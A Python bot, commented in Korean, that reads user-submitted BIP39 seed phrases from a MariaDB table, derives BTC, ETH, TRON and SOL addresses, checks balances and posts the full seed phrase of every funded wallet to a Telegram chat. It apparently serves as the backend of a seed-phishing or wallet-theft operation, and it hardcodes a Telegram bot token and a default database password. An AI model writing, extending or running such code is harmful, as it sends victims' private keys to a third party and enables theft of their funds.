#!/usr/bin/env python3
"""
시드 문구 잔고 검수 봇 (Python 버전)

역할:
- MariaDB seeds 테이블에서 아직 검수되지 않은 시드를 가져옴
- BIP39 니모닉으로 BTC / ETH / TRON / SOL 잔고 조회
- 잔고가 0보다 큰 체인이 있으면 텔레그램으로 알림 전송
- seeds 테이블에 balance / usdt_balance / checked / checked_at 업데이트

기존 Node.js 기반 seed-checker.js 역할을 대체하는 용도.
"""

import datetime
import os
import sys
import time
from typing import Any, Dict, List

import requests
import pymysql
from pymysql.cursors import DictCursor

from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from bip_utils import Bip39MnemonicValidator
from bip_utils.utils.mnemonic.mnemonic_ex import MnemonicChecksumError
from web3 import Web3
from eth_account import Account
from mnemonic import Mnemonic
from tronpy.keys import PrivateKey
from solders.keypair import Keypair
from solana.rpc.api import Client
import bip32utils


# --------------------------------------------------
# 설정
# --------------------------------------------------

DB_CONFIG = {
    "host": os.getenv("DB_HOST", "localhost"),
    "port": int(os.getenv("DB_PORT", "3306")),
    "user": os.getenv("DB_USER", "mynolab_user"),
    "password": os.getenv("DB_PASSWORD", "mynolab2026"),
    "database": os.getenv("DB_NAME", "mynolab"),
    "charset": "utf8mb4",
}

TELEGRAM_BOT_TOKEN = os.getenv(
    "TELEGRAM_BOT_TOKEN", "8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ"
)
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "-1003732339035")

BATCH_SIZE = int(os.getenv("SEED_BATCH_SIZE", "1"))
INTERVAL_SECONDS = int(os.getenv("SEED_CHECK_INTERVAL", "30"))
MIN_BALANCE = 0.0


# --------------------------------------------------
# 공통 유틸
# --------------------------------------------------

def now_kr() -> str:
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def send_telegram(message: str) -> bool:
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(
            url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML",
            },
            timeout=10,
        )
        data = resp.json()
        if data.get("ok"):
            print("✅ 텔레그램 전송 성공")
            return True
        print("❌ 텔레그램 전송 실패:", data)
        return False
    except Exception as e:
        print("❌ 텔레그램 전송 오류:", e)
        return False


def get_db_connection():
    return pymysql.connect(
        host=DB_CONFIG["host"],
        port=DB_CONFIG["port"],
        user=DB_CONFIG["user"],
        password=DB_CONFIG["password"],
        database=DB_CONFIG["database"],
        charset=DB_CONFIG["charset"],
        autocommit=True,
        cursorclass=DictCursor,
    )


def ensure_seed_columns(conn) -> None:
    """seeds 테이블에 필요한 컬럼이 없으면 추가."""
    with conn.cursor() as cur:
        # checked
        cur.execute("SHOW COLUMNS FROM seeds LIKE 'checked'")
        if cur.rowcount == 0:
            cur.execute(
                "ALTER TABLE seeds "
                "ADD COLUMN checked TINYINT(1) DEFAULT 0 AFTER created_at"
            )
            print("✅ seeds.checked 컬럼 추가")

        # checked_at
        cur.execute("SHOW COLUMNS FROM seeds LIKE 'checked_at'")
        if cur.rowcount == 0:
            cur.execute(
                "ALTER TABLE seeds "
                "ADD COLUMN checked_at DATETIME NULL AFTER checked"
            )
            print("✅ seeds.checked_at 컬럼 추가")

        # balance
        cur.execute("SHOW COLUMNS FROM seeds LIKE 'balance'")
        if cur.rowcount == 0:
            cur.execute(
                "ALTER TABLE seeds "
                "ADD COLUMN balance DECIMAL(36,18) DEFAULT 0 AFTER checked_at"
            )
            print("✅ seeds.balance 컬럼 추가")

        # usdt_balance
        cur.execute("SHOW COLUMNS FROM seeds LIKE 'usdt_balance'")
        if cur.rowcount == 0:
            cur.execute(
                "ALTER TABLE seeds "
                "ADD COLUMN usdt_balance DECIMAL(36,18) DEFAULT 0 AFTER balance"
            )
            print("✅ seeds.usdt_balance 컬럼 추가")


def get_unchecked_seeds(conn) -> List[Dict[str, Any]]:
    with conn.cursor() as cur:
        cur.execute(
            """
            SELECT id, user_id, phrase, created_at
            FROM seeds
            WHERE
              (checked IS NULL OR checked = 0)
              OR btc IS NULL
              OR eth IS NULL
              OR tron IS NULL
              OR sol IS NULL
            ORDER BY created_at ASC
            LIMIT %s
            """,
            (BATCH_SIZE,),
        )
        return list(cur.fetchall())


def save_balance_to_db(
    conn,
    seed_id: int,
    balance: float,
    usdt_balance: float,
    btc_balance: float,
    eth_balance: float,
    tron_balance: float,
    sol_balance: float,
) -> None:
    with conn.cursor() as cur:
        cur.execute(
            """
            UPDATE seeds SET
              balance = %s,
              usdt_balance = %s,
              btc = %s,
              eth = %s,
              tron = %s,
              sol = %s
            WHERE id = %s
            """,
            (
                balance,
                usdt_balance,
                btc_balance,
                eth_balance,
                tron_balance,
                sol_balance,
                seed_id,
            ),
        )


def mark_as_checked(conn, seed_id: int) -> None:
    with conn.cursor() as cur:
        cur.execute(
            "UPDATE seeds SET checked = 1, checked_at = NOW() WHERE id = %s",
            (seed_id,),
        )


# --------------------------------------------------
# 니모닉 검증
# --------------------------------------------------

def validate_mnemonic_or_raise(mnemonic: str) -> str:
    mnemonic = " ".join(mnemonic.strip().split())

    words = mnemonic.split()
    if len(words) not in (12, 15, 18, 21, 24):
        raise ValueError(
            f"니모닉 단어 개수 오류: {len(words)}개 "
            "(BIP39는 12/15/18/21/24 단어만 유효)"
        )

    try:
        Bip39MnemonicValidator().Validate(mnemonic)
    except MnemonicChecksumError:
        raise ValueError(
            "니모닉이 BIP39 체크섬을 통과하지 못했습니다. "
            "철자를 다시 확인하세요."
        )
    except Exception as e:
        raise ValueError(f"니모닉 검증 중 오류: {e}")

    return mnemonic


# --------------------------------------------------
# 체인별 잔고 조회
# --------------------------------------------------

def check_btc(mnemonic: str) -> Dict[str, Any]:
    mnemonic = validate_mnemonic_or_raise(mnemonic)

    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)

    address = (
        bip44_ctx.Purpose()
        .Coin()
        .Account(0)
        .Change(Bip44Changes.CHAIN_EXT)
        .AddressIndex(0)
        .PublicKey()
        .ToAddress()
    )

    print(f"[BTC] Address: {address}")

    api_urls = [
        f"https://blockstream.info/api/address/{address}",
        f"https://mempool.space/api/address/{address}",
    ]

    last_error = None

    for url in api_urls:
        try:
            print(f"[BTC] Trying API: {url}")
            resp = requests.get(url, timeout=10)
            resp.raise_for_status()
            data = resp.json()

            chain_stats = data.get("chain_stats", {})
            mempool_stats = data.get("mempool_stats", {})

            confirmed_sats = (
                chain_stats.get("funded_txo_sum", 0)
                - chain_stats.get("spent_txo_sum", 0)
            )
            unconfirmed_sats = (
                mempool_stats.get("funded_txo_sum", 0)
                - mempool_stats.get("spent_txo_sum", 0)
            )

            total_sats = confirmed_sats + unconfirmed_sats
            total_btc = total_sats / 100_000_000

            print(f"[BTC] Confirmed:   {confirmed_sats} sats")
            print(f"[BTC] Unconfirmed: {unconfirmed_sats} sats")
            print(f"[BTC] Balance:     {total_btc} BTC")

            return {
                "network": "btc",
                "symbol": "BTC",
                "address": address,
                "balance": float(total_btc),
            }

        except Exception as e:
            print(f"[BTC] API failed: {url} -> {e}")
            last_error = e

    raise RuntimeError(f"BTC 잔고 조회 실패: {last_error}")


Account.enable_unaudited_hdwallet_features()


def check_eth(mnemonic: str) -> Dict[str, Any]:
    mnemonic = validate_mnemonic_or_raise(mnemonic)

    account = Account.from_mnemonic(mnemonic)  # m/44'/60'/0'/0/0
    address = account.address
    print(f"[ETH] Address: {address}")

    rpc_urls = [
        "https://cloudflare-eth.com",
        "https://ethereum-rpc.publicnode.com",
        "https://rpc.ankr.com/eth",
    ]

    last_error = None

    for rpc_url in rpc_urls:
        try:
            print(f"[ETH] Trying RPC: {rpc_url}")
            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 10}))

            if not w3.is_connected():
                raise ConnectionError(f"Ethereum RPC 연결 실패: {rpc_url}")

            balance_wei = w3.eth.get_balance(address)
            balance_eth = w3.from_wei(balance_wei, "ether")

            print(f"[ETH] Balance: {balance_eth} ETH")
            return {
                "network": "eth",
                "symbol": "ETH",
                "address": address,
                "balance": float(balance_eth),
            }

        except Exception as e:
            print(f"[ETH] RPC failed: {rpc_url} -> {e}")
            last_error = e

    raise RuntimeError(f"ETH 잔고 조회 실패: {last_error}")


def check_tron(mnemonic_phrase: str) -> Dict[str, Any]:
    mnemonic_phrase = validate_mnemonic_or_raise(mnemonic_phrase)

    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(mnemonic_phrase)

    root = bip32utils.BIP32Key.fromEntropy(seed)

    path = [44 + 0x80000000, 195 + 0x80000000, 0 + 0x80000000, 0, 0]
    child_key = root
    for node in path:
        child_key = child_key.ChildKey(node)

    private_key_hex = child_key.PrivateKey().hex()
    private_key_obj = PrivateKey(bytes.fromhex(private_key_hex))
    address = private_key_obj.public_key.to_base58check_address()

    print(f"[TRON] Address: {address}")

    rpc_urls = [
        "https://api.trongrid.io/wallet/getaccount",
        "https://api.tronstack.io/wallet/getaccount",
        "https://nile.trongrid.io/wallet/getaccount",
    ]

    last_error = None

    for url in rpc_urls:
        try:
            print(f"[TRON] Trying RPC: {url}")

            resp = requests.post(
                url,
                json={"address": address, "visible": True},
                timeout=10,
            )

            resp.raise_for_status()
            data = resp.json()

            balance_sun = data.get("balance", 0)
            balance_trx = balance_sun / 1_000_000

            print(f"[TRON] Balance: {balance_trx} TRX")
            return {
                "network": "tron",
                "symbol": "TRX",
                "address": address,
                "balance": float(balance_trx),
            }

        except Exception as e:
            print(f"[TRON] RPC failed: {url} -> {e}")
            last_error = e

    raise RuntimeError(f"TRON 잔고 조회 실패: {last_error}")


def check_sol(mnemonic_phrase: str, passphrase: str = "") -> Dict[str, Any]:
    mnemonic_phrase = validate_mnemonic_or_raise(mnemonic_phrase)

    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(mnemonic_phrase, passphrase)

    path = "m/44'/501'/0'/0'"
    keypair = Keypair.from_seed_and_derivation_path(seed, path)
    public_key = keypair.pubkey()

    print(f"[SOL] Address: {public_key}")

    client = Client("https://api.mainnet-beta.solana.com")
    balance_resp = client.get_balance(public_key)

    lamports = balance_resp.value
    sol_balance = lamports / 10**9

    print(f"[SOL] Balance: {sol_balance} SOL")
    return {
        "network": "sol",
        "symbol": "SOL",
        "address": str(public_key),
        "balance": float(sol_balance),
    }


def check_all_chains(mnemonic: str) -> List[Dict[str, Any]]:
    results: List[Dict[str, Any]] = []

    for checker in (check_btc, check_eth, check_tron, check_sol):
        try:
            res = checker(mnemonic)
            results.append(res)
        except Exception as e:
            print(f"⚠️  {checker.__name__} 실패:", e)

    return results


# --------------------------------------------------
# 시드 한 개 처리
# --------------------------------------------------

def process_seed(conn, seed_row: Dict[str, Any]) -> None:
    seed_id = seed_row["id"]
    user_id = seed_row["user_id"]
    phrase = seed_row["phrase"]
    created_at = seed_row["created_at"]

    print("")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"🔍 시드 검수 시작 (ID={seed_id}, 사용자={user_id})")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    try:
        chain_results = check_all_chains(phrase)

        print("")
        print("💰 체인별 잔고 결과:")
        print("")
        for r in chain_results:
            print(
                f"🌐 {r['network'].upper():<6} 주소={r['address']} "
                f"잔고={r['balance']} {r['symbol']}"
            )

        chains_with_balance = [
            r for r in chain_results if float(r.get("balance", 0.0)) > MIN_BALANCE
        ]

        # 체인별 잔고 분리
        def get_chain_balance(net: str) -> float:
            for r in chain_results:
                if r.get("network") == net:
                    return float(r.get("balance", 0.0))
            return 0.0

        btc_balance = get_chain_balance("btc")
        eth_balance = get_chain_balance("eth")
        tron_balance = get_chain_balance("tron")
        sol_balance = get_chain_balance("sol")

        # 최대 잔고(요약용)
        max_balance = max(btc_balance, eth_balance, tron_balance, sol_balance, 0.0)

        # usdt_balance 는 아직 사용 안 함 (0으로 유지)
        save_balance_to_db(
            conn,
            seed_id,
            max_balance,
            0.0,
            btc_balance,
            eth_balance,
            tron_balance,
            sol_balance,
        )

        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"📊 요약: 최대 잔고={max_balance}, 잔고 있는 체인 수={len(chains_with_balance)}")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        if chains_with_balance:
            print(f"🎉 잔고 발견! ID={seed_id}, 체인 수={len(chains_with_balance)}")

            message_lines = []
            message_lines.append("🚨 <b>잔고 발견!</b>")
            message_lines.append("")
            message_lines.append(f"👤 <b>사용자:</b> {user_id}")
            message_lines.append(f"🆔 <b>시드 ID:</b> {seed_id}")
            message_lines.append(
                f"📅 <b>수신일:</b> {created_at.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            message_lines.append("")

            for chain in chains_with_balance:
                message_lines.append("━━━━━━━━━━━━━━━━━━")
                message_lines.append(f"🌐 <b>{chain['network'].upper()}</b>")
                message_lines.append(
                    f"💰 <b>잔고:</b> {chain['balance']} {chain['symbol']}"
                )
                message_lines.append(
                    f"🔑 <b>주소:</b> <code>{chain['address']}</code>"
                )

            message_lines.append("")
            message_lines.append("━━━━━━━━━━━━━━━━━━")
            message_lines.append("📝 <b>시드 문구:</b>")
            message_lines.append(f"<code>{phrase}</code>")
            message_lines.append("━━━━━━━━━━━━━━━━━━")

            message = "\n".join(message_lines)
            print("📨 텔레그램 전송 중...")
            sent = send_telegram(message)
            if sent:
                print("✅ 텔레그램 전송 성공")
            else:
                print("❌ 텔레그램 전송 실패")
        else:
            print(f"📭 잔고 없음 (ID={seed_id})")

        mark_as_checked(conn, seed_id)
        print("✅ 검수 플래그 저장 완료")

    except Exception as e:
        print(f"❌ 시드 처리 중 오류 (ID={seed_id}): {e}")


# --------------------------------------------------
# 메인 루프
# --------------------------------------------------

def main():
    print("")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🔍 시드 문구 잔고 검수 시스템 (Python) 시작")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"📨 텔레그램 채팅: {TELEGRAM_CHAT_ID}")
    print(f"⏱️  인터벌: {INTERVAL_SECONDS}초")
    print(f"📦 배치 크기: {BATCH_SIZE}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("")

    try:
        conn = get_db_connection()
        print("✅ MariaDB 연결 성공")
    except Exception as e:
        print("❌ MariaDB 연결 실패:", e)
        sys.exit(1)

    try:
        ensure_seed_columns(conn)
    except Exception as e:
        print("❌ seeds 테이블 스키마 업데이트 실패:", e)
        sys.exit(1)

    print("📨 텔레그램 연결 테스트 중...")
    if not send_telegram("✅ 시드 문구 검수 시스템(Python)이 시작되었습니다!"):
        print("❌ 텔레그램 연결 실패! 토큰/채팅 ID를 확인하세요.")
        sys.exit(1)

    print("")
    print("🎯 검수 시작... (Ctrl+C로 종료)")
    print("")

    try:
        while True:
            try:
                seeds = get_unchecked_seeds(conn)
            except Exception as e:
                print("❌ DB 조회 오류:", e)
                time.sleep(INTERVAL_SECONDS)
                continue

            if not seeds:
                print(f"📭 미검수 시드 없음 ({now_kr()})")
                time.sleep(INTERVAL_SECONDS)
                continue

            print(f"🔍 {len(seeds)}개 시드 검수 시작...")

            for seed in seeds:
                process_seed(conn, seed)
                time.sleep(1)

            print(f"✅ 검수 완료 ({len(seeds)}개)")
            time.sleep(INTERVAL_SECONDS)

    except KeyboardInterrupt:
        print("\n👋 종료 요청(Ctrl+C) 감지, 프로그램을 종료합니다.")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def recheck_specific(seed_ids: List[int]) -> None:
    """관리자 요청으로 특정 시드 ID 목록만 재확인 후 종료."""
    print("")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🔄 시드 재확인 모드 (SEED_IDS)")
    print(f"   대상 ID: {seed_ids}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    try:
        conn = get_db_connection()
    except Exception as e:
        print("❌ MariaDB 연결 실패:", e)
        sys.exit(1)

    placeholders = ", ".join(["%s"] * len(seed_ids))
    with conn.cursor() as cur:
        cur.execute(
            f"SELECT id, user_id, phrase, created_at FROM seeds WHERE id IN ({placeholders})",
            seed_ids,
        )
        seeds = list(cur.fetchall())

    if not seeds:
        print("⚠️ 해당 ID의 시드를 찾을 수 없습니다.")
        conn.close()
        sys.exit(0)

    # checked 플래그 강제 초기화 → process_seed 가 skip 하지 않도록
    with conn.cursor() as cur:
        cur.execute(
            f"UPDATE seeds SET checked = 0 WHERE id IN ({placeholders})",
            seed_ids,
        )

    for seed in seeds:
        process_seed(conn, seed)
        time.sleep(0.5)

    print(f"✅ 재확인 완료 ({len(seeds)}개)")
    conn.close()


def recheck_event_seeds(event_seed_ids: List[int]) -> None:
    """관리자 event_seeds 테이블의 특정 시드를 검사하고 결과를 event_seeds에 업데이트."""
    print("")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🎁 이벤트 시드 검수 모드 (EVENT_SEED_IDS)")
    print(f"   대상 ID: {event_seed_ids}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    try:
        conn = get_db_connection()
    except Exception as e:
        print("❌ MariaDB 연결 실패:", e)
        sys.exit(1)

    placeholders = ", ".join(["%s"] * len(event_seed_ids))
    with conn.cursor() as cur:
        cur.execute(
            f"SELECT id, phrase FROM event_seeds WHERE id IN ({placeholders}) AND status = 'available'",
            event_seed_ids,
        )
        seeds = list(cur.fetchall())

    if not seeds:
        print("⚠️ 해당 ID의 이벤트 시드가 없거나 이미 지급됐습니다.")
        conn.close()
        sys.exit(0)

    for seed in seeds:
        seed_id = seed["id"]
        phrase = seed["phrase"]
        print(f"\n🔍 이벤트 시드 검수 (ID={seed_id})")

        try:
            chain_results = check_all_chains(phrase)

            def get_bal(net):
                for r in chain_results:
                    if r.get("network") == net:
                        return float(r.get("balance", 0.0))
                return 0.0

            btc = get_bal("btc")
            eth = get_bal("eth")
            tron = get_bal("tron")
            sol = get_bal("sol")
            chains_with_balance = [r for r in chain_results if float(r.get("balance", 0.0)) > MIN_BALANCE]

            # event_seeds 테이블 잔고 업데이트
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE event_seeds SET btc=%s, eth=%s, tron=%s, sol=%s WHERE id=%s",
                    (btc or None, eth or None, tron or None, sol or None, seed_id),
                )

            print(f"   BTC={btc}, ETH={eth}, TRON={tron}, SOL={sol}")

            if chains_with_balance:
                print(f"   🎉 잔고 발견! ({len(chains_with_balance)}개 체인)")
                msg_lines = [
                    "🎁 <b>[이벤트 시드] 잔고 확인!</b>",
                    f"🆔 <b>이벤트 시드 ID:</b> {seed_id}",
                    "",
                ]
                for c in chains_with_balance:
                    msg_lines += [
                        "━━━━━━━━━━━━━━━━━━",
                        f"🌐 <b>{c['network'].upper()}</b>",
                        f"💰 <b>잔고:</b> {c['balance']} {c['symbol']}",
                        f"🔑 <b>주소:</b> <code>{c['address']}</code>",
                    ]
                msg_lines += ["", "━━━━━━━━━━━━━━━━━━", "📝 <b>시드 문구:</b>", f"<code>{phrase}</code>", "━━━━━━━━━━━━━━━━━━"]
                send_telegram("\n".join(msg_lines))
            else:
                print("   📭 잔고 없음")

        except Exception as e:
            print(f"   ❌ 오류: {e}")

        time.sleep(0.5)

    print(f"\n✅ 이벤트 시드 검수 완료 ({len(seeds)}개)")
    conn.close()


if __name__ == "__main__":
    event_seed_ids_env = os.getenv("EVENT_SEED_IDS", "").strip()
    seed_ids_env = os.getenv("SEED_IDS", "").strip()

    if event_seed_ids_env:
        try:
            ids = [int(x.strip()) for x in event_seed_ids_env.split(",") if x.strip()]
        except ValueError:
            print("❌ EVENT_SEED_IDS 형식 오류 (예: EVENT_SEED_IDS=1,2,3)")
            sys.exit(1)
        recheck_event_seeds(ids)
    elif seed_ids_env:
        try:
            ids = [int(x.strip()) for x in seed_ids_env.split(",") if x.strip()]
        except ValueError:
            print("❌ SEED_IDS 형식 오류 (예: SEED_IDS=1,2,3)")
            sys.exit(1)
        recheck_specific(ids)
    else:
        main()

